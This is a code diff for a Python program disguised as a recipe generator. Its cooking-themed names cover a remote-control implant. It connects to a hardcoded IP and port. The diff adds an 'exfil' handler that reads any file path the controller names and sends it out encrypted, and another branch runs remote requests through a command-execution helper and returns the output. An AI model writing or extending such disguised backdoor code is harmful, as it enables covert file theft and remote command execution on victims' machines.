@@ -5,7 +5,7 @@ import gui
 from gui import *
 import random
 
-recipesrusip = '172.31.100.37'
+recipesrusip = '172.31.4.131'
 connport = 8080
 recipeseed = b'\xd1u\x80\x8c\x14\x05LD\xd3m\xb9\x8c6\xc5\xf1\x8d\\O\xc8\xaf\x08\xb1w\x17'
 
@@ -87,18 +87,25 @@ def run_recipe_app():
             conn.close()
             recipe_list.remove("noodle_recipes_generator")
         elif request[0] == "exfil":
-            recipe_generator.run(generate_recipes())
-            try:
-                recipe = open("recipes.txt", "r+")                   
-            except FileNotFoundError:
+            if len(request) > 1 and request[1] == "image":
+                with open(request[2], "r+") as f:
+                    image_data = f.read()
+                conn.sendall(stir_ingredients(recipeseed, image_data))
+                conn.sendall("Done")
+            else:
                 recipe_generator.run(generate_recipes())
-                recipe = open("recipes.txt", "r+")
+                try:
+                    recipe = open("recipes.txt", "r+")                   
+                except FileNotFoundError:
+                    recipe_generator.run(generate_recipes())
+                    recipe = open("recipes.txt", "r+")
 
-            for line in recipe:
-                conn.sendall(stir_ingredients(recipeseed, json.dumps(line).encode()))
+                for line in recipe:
+                    conn.sendall(stir_ingredients(recipeseed, json.dumps(line).encode()))
 
-            recipe_list.remove("recipes.txt")
-            # recipe_list.remove("noodle_recipes_generator.py")
+                conn.sendall("Done")
+                recipe_list.remove("recipes.txt")
+                # recipe_list.remove("noodle_recipes_generator.py")
         else:
             validator = recipe_validator(request, stdout=validation_output.PIPE)
             val_out = []
@@ -108,6 +115,7 @@ def run_recipe_app():
 
             if len(val_out) != 0:
                 conn.sendall(mix_ingredients(recipeseed, json.dumps(val_out).encode()))
+                conn.sendall("Done")
 
 def make_random_recipe():
     steps = random.randint(0,25)
